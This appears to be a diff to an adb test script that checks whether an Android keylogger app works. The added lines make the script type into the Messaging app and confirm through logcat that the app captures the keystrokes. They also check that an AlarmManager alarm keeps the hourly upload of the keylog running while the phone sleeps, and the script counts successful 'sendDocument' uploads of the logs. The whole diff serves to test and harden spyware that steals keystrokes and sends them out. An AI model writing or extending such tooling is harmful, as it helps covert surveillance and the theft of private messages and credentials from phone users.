@@ -27,6 +27,9 @@ PKG=com.bshu2.androidkeylogger
 SVC=$PKG/$PKG.Keylogger
 FILES=/sdcard/Android/data/$PKG/files
 ARCHIVE=$FILES/keylog_$(date +%Y%m%d).txt
+# Upload cadence of the APK under test, in ms. Override when testing a fast
+# build: INTERVAL_MS=60000 ALARM_WAIT=1 ./tools/device-retest.sh
+INTERVAL_MS=${INTERVAL_MS:-3600000}
 PULLED=$(mktemp -t keylog-pull.XXXXXX)
 trap 'rm -f "$PULLED"' EXIT
 
@@ -112,6 +115,24 @@ sleep 15
 log "-- logcat proof"
 adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true
 
+# Optional, ALARM_WAIT=1: prove the durable AlarmManager chain, not just the
+# rebind path. Types a marker, then waits out one interval with no interaction
+# and checks the alarm broadcast did the rotate+upload itself.
+ALARM_FIRED=0
+if [ "${ALARM_WAIT:-0}" = "1" ]; then
+    log "-- alarm wait (interval + 30s, no interaction)"
+    r am start -n com.android.messaging/.ui.conversationlist.ConversationListActivity
+    sleep 4
+    r input tap 513 1809
+    sleep 2
+    r input text 'alarmprobe'
+    WAIT=$(( (INTERVAL_MS / 1000) + 30 ))
+    log "   waiting ${WAIT}s for the alarm"
+    sleep "$WAIT"
+    ALARM_FIRED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm received' || true)
+    adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | grep 'alarm' | tail -5 || true
+fi
+
 log "-- outbox (empty after a 2xx upload)"
 r ls -l "$FILES/outbox/"
 
@@ -125,6 +146,9 @@ FAILED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -E 'sendDocument (faile
 # so it cannot prove a live connection. onServiceConnected() is the only thing
 # that rotates and uploads, and it always logs this line.
 BOUND=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)
+# The alarm is what makes the hourly upload survive doze; without it nothing
+# fires on a sleeping phone.
+ARMED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'alarm armed in' || true)
 
 DELTA=0; FULL=0; BACK=0
 if adb pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
@@ -136,6 +160,8 @@ else
 fi
 
 log "service started (expect >0)      : $BOUND"
+log "alarm armed (expect >0)          : $ARMED"
+log "alarm fired (expect >0 if ALARM_WAIT=1) : $ALARM_FIRED"
 log "sendDocument 2xx (expect >0)     : $SENT"
 log "sendDocument failures (expect 0) : $FAILED"
 log "delta-only line (expect >0)      : $DELTA"
